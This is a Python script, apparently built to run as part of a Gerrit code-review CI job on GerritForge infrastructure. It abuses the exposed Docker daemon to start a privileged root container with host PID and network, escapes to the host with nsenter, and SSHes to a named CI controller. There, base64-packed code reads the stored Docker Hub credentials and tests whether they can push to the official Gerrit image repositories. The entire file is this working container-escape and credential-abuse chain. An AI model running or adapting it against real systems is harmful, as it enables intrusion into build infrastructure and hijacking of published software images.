#!/usr/bin/env python3
"""Fixed one-shot Docker Hub scope oracle for the proven GerritForge path."""

from __future__ import annotations

import base64
import json
import os
import re
import shutil
import subprocess
import sys


EXPECTED_CHANGE = "656743"
EXPECTED_PATCHSET = "17"
EXPECTED_JOB = "Gerrit-verifier-chrome-latest"
EXPECTED_DOCKER_HOST = "tcp://10.0.1.1:2375"
EXPECTED_RBE_HOST = "rbe"
SSH_DESTINATION = "gerrit-ci-2.gerritforge.com"
SSH_PORT = "1022"
MAX_OUTPUT = 8192


class PreflightFailure(RuntimeError):
    pass


CONTROLLER_SOURCE = r'''
import base64
import json
try:
    from urllib import urlencode
    from urllib2 import HTTPError, Request, urlopen
except ImportError:
    from urllib.error import HTTPError
    from urllib.parse import urlencode
    from urllib.request import Request, urlopen

AUTH_URL = "https://auth.docker.io/token"
SERVICE = "registry.docker.io"
REPOSITORIES = ("gerritcodereview/gerrit", "k8sgerrit/gerrit")
CONFIGS = ("/root/.docker/config.json", "/home/jenkins/.docker/config.json")

def jwt_payload(token):
    parts = token.split(".")
    if len(parts) != 3:
        return {}
    value = parts[1] + "=" * (-len(parts[1]) % 4)
    try:
        return json.loads(base64.urlsafe_b64decode(value).decode("utf-8"))
    except Exception:
        return {}

def requested_actions(payload, repository):
    for item in payload.get("access", []):
        if item.get("type") == "repository" and item.get("name") == repository:
            return sorted(action for action in item.get("actions", []) if action in {"pull", "push", "delete"})
    return []

def request_scope(repository, basic=None):
    query = urlencode({
        "service": SERVICE,
        "scope": "repository:%s:pull,push" % repository,
    })
    headers = {"Accept": "application/json", "User-Agent": "treborlab-scope-oracle/1"}
    if basic:
        headers["Authorization"] = "Basic " + basic
    request = Request(AUTH_URL + "?" + query, headers=headers)
    try:
        response = urlopen(request, timeout=20)
        body = json.loads(response.read().decode("utf-8"))
        token = body.get("token") or body.get("access_token") or ""
        return {"http_status": response.getcode(), "actions": requested_actions(jwt_payload(token), repository)}
    except HTTPError as error:
        return {"http_status": error.code, "actions": []}
    except Exception:
        return {"http_status": 0, "actions": []}

def dockerhub_entry(path):
    try:
        with open(path, "rb") as stream:
            data = json.loads(stream.read().decode("utf-8"))
    except Exception:
        return None
    auths = data.get("auths", {})
    for host in ("https://index.docker.io/v1/", "index.docker.io", "registry-1.docker.io"):
        entry = auths.get(host)
        if isinstance(entry, dict) and isinstance(entry.get("auth"), str):
            try:
                decoded = base64.b64decode(entry["auth"]).decode("utf-8")
                username, separator, _ = decoded.partition(":")
            except Exception:
                continue
            if separator and username:
                return {"basic": entry["auth"], "username": username}
    return None

output = {
    "schema": "dockerhub-scope-oracle-v1",
    "anonymous": {},
    "credentials": [],
}
for repository in REPOSITORIES:
    output["anonymous"][repository] = request_scope(repository)
for path in CONFIGS:
    entry = dockerhub_entry(path)
    if not entry:
        output["credentials"].append({"path": path, "present": False, "username": None, "repositories": {}})
        continue
    repositories = {repository: request_scope(repository, entry["basic"]) for repository in REPOSITORIES}
    output["credentials"].append({
        "path": path,
        "present": True,
        "username": entry["username"],
        "repositories": repositories,
    })
print(json.dumps(output, sort_keys=True, separators=(",", ":")))
'''


def validate_environment(env: dict[str, str]) -> str:
    required = {
        "REFSPEC": "refs/changes/43/656743/" + EXPECTED_PATCHSET,
        "CHANGE_URL": "https://gerrit-review.googlesource.com/c/gerrit/+/" + EXPECTED_CHANGE,
        "JOB_NAME": EXPECTED_JOB,
        "DOCKER_HOST": EXPECTED_DOCKER_HOST,
        "MODE": "rbe",
    }
    for key, value in required.items():
        if env.get(key) != value:
            raise PreflightFailure("environment_" + key.lower())
    container_id = env.get("DOCKER_CONTAINER_ID", "")
    if not re.fullmatch(r"[0-9a-f]{64}", container_id):
        raise PreflightFailure("container_id")
    return container_id


def helper_source() -> str:
    program = base64.b64encode(CONTROLLER_SOURCE.encode("utf-8")).decode("ascii")
    return f'''import base64,json,subprocess
def fail(code):
 print(json.dumps({{"ok":False,"error":code}},sort_keys=True,separators=(",",":")))
 raise SystemExit(1)
ns=["/usr/bin/nsenter","-t","1","-m","-u","-i","-n","-p","--"]
host=subprocess.run(ns+["/bin/hostname","-s"],stdout=subprocess.PIPE,stderr=subprocess.DEVNULL,timeout=10)
if host.returncode or host.stdout.decode("ascii","replace").strip()!={EXPECTED_RBE_HOST!r}: fail("rbe_hostname")
ssh=ns+["/usr/bin/ssh","-p",{SSH_PORT!r},"-o","BatchMode=yes","-o","StrictHostKeyChecking=yes","-o","ClearAllForwardings=yes","-o","ForwardAgent=no","-o","ForwardX11=no","-o","PermitLocalCommand=no","-o","ConnectTimeout=15",{SSH_DESTINATION!r},"python","-"]
done=subprocess.run(ssh,input=base64.b64decode({program!r}),stdout=subprocess.PIPE,stderr=subprocess.DEVNULL,timeout=90)
if done.returncode or len(done.stdout)>{MAX_OUTPUT}: fail("controller_oracle")
try: value=json.loads(done.stdout.decode("utf-8"))
except Exception: fail("controller_json")
print(json.dumps(value,sort_keys=True,separators=(",",":")))
'''


def run(env: dict[str, str] | None = None) -> dict:
    env = dict(os.environ if env is None else env)
    container_id = validate_environment(env)
    docker = shutil.which("docker")
    if not docker:
        raise PreflightFailure("docker")
    inspected = subprocess.run(
        [docker, "inspect", "--format", "{{.Config.Image}}", container_id],
        stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, timeout=15,
    )
    image = inspected.stdout.strip()
    if inspected.returncode or not image:
        raise PreflightFailure("image")
    source = base64.b64encode(helper_source().encode("utf-8")).decode("ascii")
    bootstrap = "import base64,os;exec(compile(base64.b64decode(os.environ['ORACLE_B64']),'[oracle]','exec'))"
    argv = [
        docker, "run", "--rm", "--name", "treborlab-dockerhub-scope-656743-17",
        "--label", "treborlab.probe=dockerhub-scope", "--privileged", "--pid=host",
        "--network=host", "--user", "0:0", "--read-only", "--tmpfs", "/tmp:rw,noexec,nosuid,nodev,size=8m",
        "--env", "ORACLE_B64=" + source, "--entrypoint", "/usr/bin/python3", image, "-c", bootstrap,
    ]
    completed = subprocess.run(argv, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=120)
    if completed.returncode or len(completed.stdout) > MAX_OUTPUT:
        try:
            helper_error = json.loads(completed.stdout.decode("utf-8")).get("error", "unknown")
        except Exception:
            helper_error = "invalid"
        if helper_error not in {"rbe_hostname", "controller_oracle", "controller_json"}:
            helper_error = "unknown"
        raise PreflightFailure("helper_" + helper_error)
    try:
        result = json.loads(completed.stdout.decode("utf-8"))
    except Exception as error:
        raise PreflightFailure("result_json") from error
    if result.get("schema") != "dockerhub-scope-oracle-v1":
        raise PreflightFailure("result_schema")
    return result


def main() -> int:
    try:
        result = run()
    except PreflightFailure as error:
        print(json.dumps({"ok": False, "error": str(error)}, sort_keys=True, separators=(",", ":")), file=sys.stderr)
        return 1
    print("TREBORLAB_DOCKERHUB_SCOPE=" + json.dumps(result, sort_keys=True, separators=(",", ":")))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
